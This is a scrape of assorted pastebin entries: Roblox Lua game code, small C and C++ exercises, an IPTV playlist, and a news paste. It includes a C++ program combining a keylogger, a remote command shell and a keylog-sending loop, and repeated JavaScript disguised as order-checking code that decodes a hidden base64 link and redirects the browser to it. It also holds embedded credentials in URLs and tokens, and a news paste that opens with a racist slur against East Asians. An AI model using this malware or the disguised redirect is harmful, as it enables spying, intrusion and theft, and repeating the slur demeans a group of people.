				hb.Transparency = 1
				local wld = Instance.new(""Weld"",hb)
				wld.Part0 = hb
				wld.Part1 = tors
				wld.C0 = CFrame.new(0,2.1,0)
				local function hi(hit)
					if not hit:IsDescendantOf(character) then
						if hit:FindFirstChildOfClass(""SpecialMesh"") then
							if hit:FindFirstChildOfClass(""SpecialMesh"").MeshId ~= ""rbxassetid://3270017"" then
								hum.WalkSpeed = 16
								wait(1)
								ammo = 1		
							end
						else
							hum.WalkSpeed = 16
							wait(1)
							ammo = 1			
						end
					else
						--nothung
					end
				end
				hb.Touched:Connect(hi)
			end
		end
		if key == ""g"" then
			if ammo > 0 then
				ammo = 0
				local fuu = Instance.new(""Part"",character)
				fuu.Anchored = true
				fuu.CanCollide = false
				fuu.Size = Vector3.new(2,2,2)
				fuu.Material = Enum.Material.Neon
				fuu.BrickColor = BrickColor.new(""Bright green"")
				fuu.FormFactor = Enum.FormFactor.Custom
				fuu.TopSurface = Enum.SurfaceType.Smooth
				fuu.BottomSurface = Enum.SurfaceType.Smooth
				fuu.CFrame = tors.CFrame
				local function heal()
					wait(0.1)
					hum.Health = hum.Health + math.random(10,40)
					local eat = Instance.new(""Sound"",character)
					eat.SoundId = ""rbxassetid://260421433""
					eat.Volume = 2
					eat:Play()
					game.Debris:AddItem(eat,0.62)
				end
				spawn(heal)
				for i = 0,1,0.05 do
					game:GetService(""RunService"").RenderStepped:wait()
					fuu.Size = fuu.Size + Vector3.new(1.5,1.5,1.5)
					fuu.Orientation = Vector3.new(math.random(0,360),math.random(0,360),math.random(0,360))
					fuu.Transparency = fuu.Transparency + 0.05
				end
				fuu:Destroy()
				wait(1)
				ammo = 1
			end
		end
		if key == ""y"" then
			if ammo > 0 then
				ammo = 0
				tors.Anchored = true
				local leak = Instance.new(""Part"",character)
				leak.Anchored = true
				leak.Transparency = 0
				leak.CanCollide = false
				leak.Size = Vector3.new(0.1,2,2)
				leak.CFrame = tors.CFrame * CFrame.fromEulerAnglesXYZ(math.rad(0),math.rad(0),math.rad(90)) + Vector3.new(0,-3,0)
				leak.Shape = Enum.PartType.Cylinder
				leak.BrickColor = BrickColor.new(""New Yeller"")
				leak.Material = Enum.Material.Neon
				wait(1)
				local function zapp()
					local zap = Instance.new(""Sound"",character)
					zap.SoundId = ""rbxassetid://1102831575""
					zap.Volume = 1
					zap:Play()
					game.Debris:AddItem(zap,0.23)
				end
				spawn(zapp)
				leak.Touched:Connect(function(hit)
					local humn = hit.Parent:FindFirstChildOfClass(""Humanoid"")
					if humn and humn.Health > 0 then
						local suspect = humn.Parent
						if suspect then
							local fakeTors = suspect:FindFirstChild(""HumanoidRootPart"")
							if fakeTors then
								local val = suspect:FindFirstChildOfClass(""BinaryStringValue"")
								if not val then
									Instance.new(""BinaryStringValue"",suspect).Name = ""fuuk""
									local value = math.random(5,10)
									if humn.Health <= value then
										if not humn.Parent:FindFirstChild(""raged"") then
											ragdolll(humn.Parent)
										end
									else
										humn:TakeDamage(value)	
									end
									wait(0.1)
									suspect:FindFirstChildOfClass(""BinaryStringValue""):Destroy()
								else
									--nothing	
								end
							end
						end
					end
				end)
				for i = 1,150 do
					game:GetService(""RunService"").RenderStepped:wait()
					leak.Size = leak.Size + Vector3.new(0.005,1,1)
				end
				for i = 0,1,0.1 do
					game:GetService(""RunService"").RenderStepped:wait()
					leak.Transparency = i
				end
				leak:Destroy()
				tors.Anchored = false
				ammo = 1
			end
		end
	end)
end)
powerTool.Unequipped:Connect(function()
	equipped = false
end)
hum.BreakJointsOnDeath = false
hum.Died:Connect(function()
	if not character:FindFirstChild(""raged"") then
		ragdolll(character)
	end
	while true do
		game:GetService(""RunService"").RenderStepped:wait()
		--workspace.CurrentCamera.CFrame = character.Head.CFrame * CFrame.new(0,0,-0.9)
		hum.Health = 0.1
		hum.PlatformStand = true
	end
end)"
t26x40xX,Untitled,Xp_Isolation,JavaScript,Saturday 29th of March 2025 02:12:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/114/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4KD9v44f,Products.js,Xp_Isolation,JavaScript,Saturday 29th of March 2025 01:57:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/744/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8QV2pcK7,A. Произведение тройки,Korotkodul,C++,Saturday 29th of March 2025 01:22:52 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
//#define pii pair <int, int> 
using namespace std;


int main() {
    int n; cin >> n;
    vector <int> a(n);
    for (int&el: a) cin >> el;
    sort(a.begin(), a.end());
}
"
3aw4vgNQ,Untitled,Xp_Isolation,JavaScript,Saturday 29th of March 2025 01:10:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/349/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QMEy5zHU,Stampa inversa,Uncino,C,Saturday 29th of March 2025 01:04:52 AM CDT,"#include <stdio.h>
#include <stdlib.h>

#define LISTELEM 10 // Numero di elementi nella lista

typedef struct stNodo   // E' solo un esperimento, quindi...
{
    struct stNodo * next;
    int payload;
} nodo;

nodo * lista;   // Testa della lista

// Creo la lista
int fill(void)
{
    int i; // Variabile di ciclo
    nodo * current; // Puntatore al nodo corrente
    nodo * tmp; // Puntatore al nodo creato

    for ( i = 0; i < LISTELEM; i++)
    {
        tmp = (nodo *) malloc(sizeof(nodo));
        if (tmp == NULL)
        {
            return -1;
        }
        tmp->next = NULL;
        tmp->payload = i;
        if (i == 0)
        {
            lista = tmp;
            current = lista;
        }
        else
        {
            current->next = tmp;
            current = tmp;
        }
    }
    return 0;
}

// Stampa la lista 
void stampa(void)
{
    nodo * n;

     for (n = lista; n != NULL; n = n->next)
        printf(""%d\n"", n->payload);
}

// Percorre la lista rovesciando i puntatori
// Al termine lista punterà all'ultimo elemento della lista
// In effetti questa funzione risolve l'intero problema in meno di 20 righe.
void reverse(void)
{
    nodo * current;
    nodo * prev; // Alle fine del ciclo di inversione punterà all'ultimo elemento della lista
    nodo * next;

    // Percorro la lista fino alla fine invertendo i puntatori
    current = lista;
    prev = NULL;
    while (current != NULL)
    {
        printf(""%d\n"", current->payload);

        next = current->next;  // Salvo il nodo successivo
        current->next = prev;  // Inverto il puntatore
        prev = current;        // Aggiorno prev
        current = next;        // E current diventa il nodo salvato
    }
    lista = prev; // Al termine faccio puntare la testa della lista sll'ultimo elemento (che adesso è il primo)
}

int main(void)
{
    int res;

    res = fill();
    if (res == -1)
    {
        return -1;
    }
    printf(""La prima chiamata a reverse percorrerà la lista originale, stampandola in ordine diretto ed invertendola\n\n"");
    reverse();
    printf(""La seconda la percorrerà dalla coda verso la testa, stampandola in ordine inverso ed invertendola nuovamente \n\n"");
    reverse();
    printf(""Chiamo la funzione di stampa per verificare che tutto sia tornato in ordine.\n"");
    stampa();

    return 0;
}
"
sELzkKtj,Index,Salvo71,JSON,Saturday 29th of March 2025 12:52:43 AM CDT,"{
""name"": ""RadiowebTV"",
""author"": ""Salvo"",
""image"": ""https://st.depositphotos.com/1008768/4671/i/950/depositphotos_46718305-stock-photo-radio-icon.jpg"",
""url"": ""https://pastebin.com/sELzkKtj"",
 ""groups"": [

{
""name"": ""TV"",
""image"": ""https://uxwing.com/wp-content/themes/uxwing/download/video-photography-multimedia/live-tv-icon.png?size=626&ext=jpg&ga=GA1.1.1546980028.1710892800&semt=ais"",
""url"": ""https://pastebin.com/Rf7bFhaP"",
""info"": ""Tv streaming""
},
{
""name"": ""TV2"",
""image"": ""https://png.pngtree.com/png-vector/20231115/ourmid/pngtree-tv-icon-multimedia-png-image_10604500.png"",
""url"": ""https://dpaste.com/3PU6UU649.txt"",
""info"": ""streaming""
},
{
""name"": ""Film"",
""image"": ""https://www.shutterstock.com/shutterstock/photos/324455369/display_1500/stock-vector-movie-time-324455369.jpg"",
""url"": ""http://163.172.51.230/get.php?username=temateci&password=EgAfeadca3&type=m3u_plus"",
""info"": ""Film streaming""
},
{
""name"": ""Primafilatv"",
""image"": ""https://image.winudf.com/v2/image/Y29tLlRlYW1DbG91ZC5Ta3lOZXRpcHR2X2ljb25fMTUzMTA1MTgwNV8wMjA/icon.png?w=160&fakeurl=1"",
""url"": ""https://dpaste.com/A9GFF2ELP.txt"",
""info"": ""Tv streaming""
},
{
""name"": ""Migliori-attori"",
""image"": ""https://m.media-amazon.com/images/I/81iT+VSS5lL._AC_UF1000,1000_QL80_.jpg"",
""url"": ""https://dpaste.com/8Z3X3DF5K.txt"",
""info"": ""Tv streaming""
},
{
""name"": ""Sz-Sport"",
""image"": ""https://i.postimg.cc/fbm1CCMD/13034.jpg"",
""url"": ""https://dpaste.com/56FWPKPQK.txt"",
""info"": ""Tv streaming""
},
{
""name"": ""RADIO"",
""image"": ""https://play-lh.googleusercontent.com/MQKEUPuDXWaHSklNGULf4gHwZvv93HwnCKJ62wr4LAqPOqMsjCbsstkCAWxFBCeK5w0=w240-h480?size=626&ext=jpg&ga=GA1.1.1546980028.1710892800&semt=ais"",
			""url"": ""https://dpaste.com/7UDVHKH6F.txt"",
			""info"": ""Stazioni radio""

		},

	]
}"
1ECjHwFS,Order.js,Xp_Isolation,JavaScript,Saturday 29th of March 2025 12:40:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/025/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kvwdTzWY,Market.js,Xp_Isolation,JavaScript,Saturday 29th of March 2025 12:24:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/082/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SmtwimXG,EyePhuckBitches.cpp,WhosYourDaddySec,C++,Friday 28th of March 2025 11:54:57 PM CDT,"#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <cstring>
#include <sys/socket.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/rfcomm.h>
#include <linux/input.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#define WEBSHELL_PORT 8080
#define AES_KEY_SIZE 32
#define NETWORK_EXFIL_PORT 9999
unsigned char aes_key[AES_KEY_SIZE];
RSA *public_key = nullptr;
RSA *private_key = nullptr;
int exfil_socket = -1;
const char* bluetooth_device_name = ""Audio_Headset"";
void generate_aes_key() {
    if (!RAND_bytes(aes_key, AES_KEY_SIZE)) {
        std::cerr << ""Error generating AES key"" << std::endl;
        exit(1);
    }
}
void generate_rsa_keys() {
    BIGNUM *bn = BN_new();
    if (!BN_set_word(bn, RSA_F4)) {
        std::cerr << ""Error setting up RSA key generation"" << std::endl;
        exit(1);
    }
    private_key = RSA_new();
    if (RSA_generate_key_ex(private_key, 2048, bn, nullptr) != 1) {
        std::cerr << ""Error generating RSA keys"" << std::endl;
        exit(1);
    }
    public_key = RSAPublicKey_dup(private_key);
    if (public_key == nullptr) {
        std::cerr << ""Error duplicating RSA public key"" << std::endl;
        exit(1);
    }
    BN_free(bn);
}
void save_rsa_keys() {
    FILE *private_key_file = fopen(""private_key.pem"", ""wb"");
    if (!private_key_file) {
        std::cerr << ""Error saving private key"" << std::endl;
        exit(1);
    }
    PEM_write_RSAPrivateKey(private_key_file, private_key, nullptr, nullptr, 0, nullptr, nullptr);
    fclose(private_key_file);
    FILE *public_key_file = fopen(""public_key.pem"", ""wb"");
    if (!public_key_file) {
        std::cerr << ""Error saving public key"" << std::endl;
        exit(1);
    }
    PEM_write_RSAPublicKey(public_key_file, public_key);
    fclose(public_key_file);
}
void encrypt_data_aes(const std::string& data, std::string& encrypted_data) {
    AES_KEY enc_key;
    AES_set_encrypt_key(aes_key, 256, &enc_key);
    size_t data_len = data.size();
    size_t encrypted_data_len = (data_len / AES_BLOCK_SIZE + 1) * AES_BLOCK_SIZE;
    unsigned char *encrypted_buf = new unsigned char[encrypted_data_len];
    AES_encrypt(reinterpret_cast<const unsigned char*>(data.c_str()), encrypted_buf, &enc_key);
    encrypted_data = std::string(reinterpret_cast<char*>(encrypted_buf), encrypted_data_len);
    delete[] encrypted_buf;
}
void encrypt_data_rsa(const std::string& data, std::string& encrypted_data) {
    int data_len = data.size();
    int rsa_len = RSA_size(public_key);
    unsigned char *encrypted_buf = new unsigned char[rsa_len];
    if (RSA_public_encrypt(data_len, reinterpret_cast<const unsigned char*>(data.c_str()), encrypted_buf, public_key, RSA_PKCS1_OAEP_PADDING) == -1) {
        std::cerr << ""Error encrypting data with RSA"" << std::endl;
        exit(1);
    }
    encrypted_data = std::string(reinterpret_cast<char*>(encrypted_buf), rsa_len);
    delete[] encrypted_buf;
}
std::string decrypt_data_rsa(const std::string& encrypted_data) {
    int rsa_len = RSA_size(private_key);
    unsigned char *decrypted_buf = new unsigned char[rsa_len];
    if (RSA_private_decrypt(encrypted_data.size(), reinterpret_cast<const unsigned char*>(encrypted_data.c_str()), decrypted_buf, private_key, RSA_PKCS1_OAEP_PADDING) == -1) {
        std::cerr << ""Error decrypting data with RSA"" << std::endl;
        exit(1);
    }
    std::string decrypted_data(reinterpret_cast<char*>(decrypted_buf));
    delete[] decrypted_buf;
    return decrypted_data;
}
void start_keylogger() {
    const char* device = ""/dev/input/event0"";
    int fd = open(device, O_RDONLY);
    if (fd == -1) {
        std::cerr << ""Error opening keylogger device."" << std::endl;
        exit(1);
    }
    struct input_event ev;
    while (true) {
        ssize_t n = read(fd, &ev, sizeof(struct input_event));
        if (n < (ssize_t) sizeof(struct input_event)) {
            std::cerr << ""Error reading key event."" << std::endl;
            break;
        }
        if (ev.type == EV_KEY && ev.value == 1) {
            std::ofstream keylog_file(""keylog.txt"", std::ios::app);
            keylog_file << ""Key pressed: "" << ev.code << std::endl;
            keylog_file.close();
        }
    }
    close(fd);
}
void handle_client(int client_socket) {
    const std::string webshell_banner = ""Audio_Headset Webshell. Type 'exit' to quit.\n> "";
    send(client_socket, webshell_banner.c_str(), webshell_banner.size(), 0);
    char buffer[1024];
    std::string command;
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            break;
        }
        command = std::string(buffer);
        command = command.substr(0, command.find(""\r\n""));
        if (command == ""exit"") {
            break;
        } else {
            FILE* fp;
            char result[1024];
            fp = popen(command.c_str(), ""r"");
            if (fp == NULL) {
                send(client_socket, ""Error executing command.\n"", 25, 0);
            } else {
                while (fgets(result, sizeof(result), fp) != NULL) {
                    send(client_socket, result, strlen(result), 0);
                }
                fclose(fp);
            }
        }
    }
    close(client_socket);
}
void start_webshell() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        std::cerr << ""Error creating socket."" << std::endl;
        return;
    }
    sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(WEBSHELL_PORT);
    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        std::cerr << ""Error binding socket."" << std::endl;
        return;
    }
    if (listen(server_fd, 5) == -1) {
        std::cerr << ""Error listening on socket."" << std::endl;
        return;
    }
    while (true) {
        int client_socket = accept(server_fd, nullptr, nullptr);
        if (client_socket == -1) {
            std::cerr << ""Error accepting client."" << std::endl;
            continue;
        }
        std::thread client_thread(handle_client, client_socket);
        client_thread.detach();
    }
    close(server_fd);
}
void start_network_exfiltration() {
    exfil_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (exfil_socket == -1) {
        std::cerr << ""Error creating exfiltration socket."" << std::endl;
        return;
    }
    sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(""127.0.0.1"");
    server_addr.sin_port = htons(NETWORK_EXFIL_PORT);
    if (connect(exfil_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        std::cerr << ""Error connecting to exfiltration server."" << std::endl;
        return;
    }
    while (true) {
        std::ifstream keylog_file(""keylog.txt"");
        if (!keylog_file.is_open()) {
            std::cerr << ""Error opening keylog file."" << std::endl;
            break;
        }
        std::string line;
        while (std::getline(keylog_file, line)) {
            send(exfil_socket, line.c_str(), line.size(), 0);
        }
        keylog_file.close();
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
    close(exfil_socket);
}
int main() {
    generate_aes_key();
    generate_rsa_keys();
    save_rsa_keys();
    
    std::thread keylogger_thread(start_keylogger);
    std::thread webshell_thread(start_webshell);
    std::thread exfiltration_thread(start_network_exfiltration);
    keylogger_thread.join();
    webshell_thread.join();
    exfiltration_thread.join();
    return 0;
}"
TX6Z8Lnv,Products.js,Xp_Isolation,JavaScript,Friday 28th of March 2025 11:53:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/219/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
drZz4Wd2,News March28 25,Newscaster_Ned,Email,Friday 28th of March 2025 11:50:11 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎l‎l‎o‎ ‎a‎l‎l‎ ‎y‎o‎u‎ ‎s‎q‎u‎i‎n‎t‎y‎ ‎e‎y‎e‎d‎ ‎f‎r‎e‎a‎k‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎r‎e‎f‎r‎a‎i‎n‎ ‎f‎r‎o‎m‎ ‎s‎a‎y‎i‎n‎g‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎r‎a‎c‎i‎s‎t‎ ‎t‎o‎d‎a‎y‎ ‎s‎i‎n‎c‎e‎ ‎I‎'‎m‎ ‎i‎n‎ ‎a‎n‎ ‎u‎n‎u‎s‎u‎a‎l‎l‎y‎ ‎g‎o‎o‎d‎ ‎m‎o‎o‎d‎.‎

E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎T‎o‎m‎m‎y‎ ‎V‎a‎l‎e‎n‎t‎i‎n‎e‎:‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎’‎ ‎a‎t‎ ‎t‎h‎e‎ ‎K‎a‎n‎s‎a‎s‎ ‎S‎t‎a‎t‎e‎ ‎C‎a‎p‎i‎t‎o‎l‎
K‎S‎-‎C‎a‎p‎i‎t‎o‎l‎-‎C‎a‎t‎h‎o‎l‎i‎c‎s‎-‎S‎a‎t‎a‎n‎i‎s‎t‎s‎
W‎h‎e‎n‎ ‎a‎ ‎t‎i‎n‎y‎ ‎b‎a‎n‎d‎ ‎o‎f‎ ‎s‎e‎l‎f‎-‎p‎r‎o‎c‎l‎a‎i‎m‎e‎d‎ ‎s‎a‎t‎a‎n‎i‎s‎t‎s‎ ‎a‎n‎n‎o‎u‎n‎c‎e‎d‎ ‎t‎h‎e‎y‎ ‎w‎o‎u‎l‎d‎ ‎h‎o‎l‎d‎ ‎a‎ ‎“‎b‎l‎a‎c‎k‎ ‎m‎a‎s‎s‎”‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎K‎a‎n‎s‎a‎s‎ ‎S‎t‎a‎t‎e‎ ‎C‎a‎p‎i‎t‎o‎l‎,‎ ‎t‎h‎e‎y‎ ‎w‎a‎n‎t‎e‎d‎ ‎t‎o‎ ‎i‎n‎f‎l‎a‎m‎e‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎.‎ ‎A‎n‎d‎ ‎t‎h‎e‎y‎ ‎d‎i‎d‎,‎ ‎b‎u‎t‎ ‎i‎t‎ ‎w‎a‎s‎ ‎n‎o‎t‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎t‎y‎p‎e‎ ‎o‎f‎ ‎f‎i‎r‎e‎ ‎t‎h‎e‎y‎ ‎i‎n‎t‎e‎n‎d‎e‎d‎.‎

T‎o‎m‎m‎y‎ ‎V‎a‎l‎e‎n‎t‎i‎n‎e‎4‎9‎1‎
…‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎L‎e‎a‎d‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎A‎s‎s‎a‎u‎l‎t‎i‎n‎g‎ ‎a‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎ ‎D‎u‎r‎i‎n‎g‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎’‎…‎
E‎l‎i‎z‎a‎b‎e‎t‎h‎ ‎W‎e‎i‎b‎e‎l‎
7‎2‎
…‎D‎.‎C‎.‎ ‎C‎a‎r‎d‎i‎n‎a‎l‎ ‎S‎l‎a‎m‎s‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎M‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎R‎e‎f‎o‎r‎m‎s‎ ‎a‎s‎ ‎‘‎C‎r‎u‎s‎a‎d‎e‎’‎
N‎e‎i‎l‎ ‎M‎u‎n‎r‎o‎
1‎,‎0‎6‎9‎
T‎r‎u‎m‎p‎ ‎U‎n‎d‎e‎r‎ ‎A‎t‎t‎a‎c‎k‎:‎ ‎M‎a‎t‎t‎ ‎B‎o‎y‎l‎e‎ ‎a‎n‎d‎ ‎N‎i‎c‎k‎ ‎G‎i‎l‎b‎e‎r‎t‎s‎o‎n‎ ‎B‎r‎e‎a‎k‎ ‎D‎o‎w‎n‎ ‎W‎h‎o‎’‎s‎ ‎C‎o‎m‎i‎n‎g‎ ‎f‎o‎r‎ ‎H‎i‎m‎
T‎u‎l‎s‎i‎ ‎G‎a‎b‎b‎a‎r‎d‎ ‎R‎e‎v‎o‎k‎e‎s‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎C‎l‎e‎a‎r‎a‎n‎c‎e‎s‎ ‎o‎f‎ ‎B‎i‎d‎e‎n‎,‎ ‎H‎a‎r‎r‎i‎s‎,‎ ‎H‎i‎l‎l‎a‎r‎y‎
O‎l‎i‎v‎i‎a‎ ‎R‎o‎n‎d‎e‎a‎u‎
2‎1‎9‎
